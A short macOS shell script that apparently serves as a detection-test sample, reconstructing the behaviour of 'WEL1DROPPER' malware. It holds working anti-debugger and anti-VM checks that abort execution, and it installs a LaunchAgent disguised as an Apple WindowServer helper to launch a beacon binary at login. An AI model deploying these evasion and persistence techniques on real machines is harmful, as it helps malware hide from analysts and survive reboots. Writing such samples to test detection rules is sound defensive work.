#!/bin/sh
# Reconstructed WEL1DROPPER macOS stage (behavioural pattern from public
# reporting). NOT live malware — exercises WEL1DROPPER_MacOS_Persistence.

# Anti-analysis: bail if a debugger/tracer or VM is present.
for t in lldb frida dtrace; do
  if pgrep -x "$t" >/dev/null 2>&1; then exit 0; fi
done
if system_profiler SPHardwareDataType 2>/dev/null | grep -qi "VMware"; then
  exit 0
fi

# Disguised WindowServer LaunchAgent persistence.
AGENT="$HOME/Library/LaunchAgents/com.apple.windowserver.helper.plist"
cat > "$AGENT" <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
  <key>Label</key><string>com.apple.windowserver.helper</string>
  <key>ProgramArguments</key><array><string>/tmp/beacon_mac.bin</string></array>
  <key>RunAtLoad</key><true/>
</dict></plist>
PLIST
launchctl load "$AGENT" 2>/dev/null
